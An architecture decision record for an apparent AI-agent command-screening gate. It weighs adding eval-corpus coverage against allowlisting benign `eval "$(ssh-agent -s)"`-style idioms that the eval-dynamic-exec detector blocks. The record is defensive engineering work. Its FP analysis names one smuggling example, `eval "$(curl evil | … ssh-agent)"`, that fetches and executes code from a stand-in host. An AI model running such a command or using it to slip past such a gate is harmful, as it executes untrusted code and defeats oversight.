# ADR-019 — Eval-corpus shape coverage + eval-dynamic-exec FP surface

- **Status:** Proposed (2026-05-30)
- **Owner decision required:** yes — option (b) changes the decision-action mapping for a currently-blocked class.

## Problem

The eval gate (`scripts/eval-decision-quality.sh` over `tests/eval-corpus.json`) is the project's
"0.0% FP / 0.0% FN" assurance. That number is only as strong as the **shapes** the corpus
exercises. Two gaps:

**(a) Missing realistic shapes.** The corpus (54 safe / 33 dangerous / 27 borderline) has no:
- large benign **bulk** payloads (the FP risk that motivated the F25/F26 `unscannable`→review caps);
- **nested-object** MCP args (e.g. `mcp__postgres__query` with `{schema, statement, timeout}`);
- **alternative arg-container** shapes (`params` / `input` / `arguments`, not just `tool_input`);
- **dual-use-on-trusted-server** entries (the P1/P2 graduated-gate path).

So "0/0" does not actually cover the shapes the MCP floors were built for.

**(b) eval-dynamic-exec false-positive surface (verified).** `detectBypassPatterns` flags
`eval` + command-substitution as `eval-dynamic-exec` (critical). Common, legitimate shell-init
idioms hit this:

```
decide({tool:"Bash", command:'eval "$(ssh-agent -s)"'})    => block  risk=10  floor=critical-risk
decide({tool:"Bash", command:'eval "$(direnv hook bash)"'}) => block  risk=10  floor=critical-risk
```

`rbenv init -`, `pyenv init -`, `nvm`, `zoxide init`, `starship init` are the same shape. The eval
corpus contains **no** `eval "$(…)"` safe entry, so this FP is invisible to the gate.

## Evidence

- Reproduced via `node` probes of `decide()` (above), 2026-05-30.
- Corpus shape counts from `tests/eval-corpus.json` (`label` tally) and the
  `tests/fixtures/replay-corpus/build-mcp.js` generator (single-key `tool_input` only).

## Options considered

1. **Coverage-only (a): add representative corpus + fixtures, weaken nothing.** Add ~4–6 entries:
   benign bulk (>2 KB), nested-object MCP arg, alt-container (`params`/`arguments`), dual-use on
   trusted server. Pure assurance gain; no engine change; eval stays 0/0. **Low risk.**
2. **(b) Carve out known-safe `eval "$(<init>)"` idioms** in `detectBypassPatterns` (allowlist the
   substituted command: `ssh-agent`, `direnv`, `*env init`, etc.) → demote to warn/route. Reduces
   real FP but **changes the decision-action mapping for a class that currently blocks** —
   operator's call, and an allowlist is itself an attack surface.
3. **(b') Document-only:** add `borderline` corpus entries pinning the current block behavior so it
   is at least visible and intentional, without changing the mapping.

## Recommendation

- Do **(1)** now as a coverage-only PR (no mapping change, eval stays 0/0) — highest-ROI,
  lowest-risk half; directly de-risks the F25/F26 anti-FP caps.
- Treat **(b)** as a separate decision. Recommend **(3)** (pin current behavior as borderline)
  unless the `eval "$(…)"`-init FP is actually biting a real workflow, in which case **(2)** with a
  tightly-scoped allowlist (exact substituted-command match, not substring).

## FP analysis

- (1) adds only *safe→allow* and *dangerous→block* control entries → cannot introduce FP/FN; it can
  only catch a future regression.
- (2) is the only option that changes live behavior; the allowlist must match the **resolved first
  token of the substitution** (e.g. `ssh-agent`), never a substring, to avoid
  `eval "$(curl evil | … ssh-agent)"`-style smuggling.

## Where it hooks

- Corpus: `tests/eval-corpus.json`; generators under `tests/fixtures/replay-corpus/`.
- (b) only: `runtime/shell-bypass-detector.js` (`detectBypassPatterns`), consumed by
  `runtime/risk-score.js`.
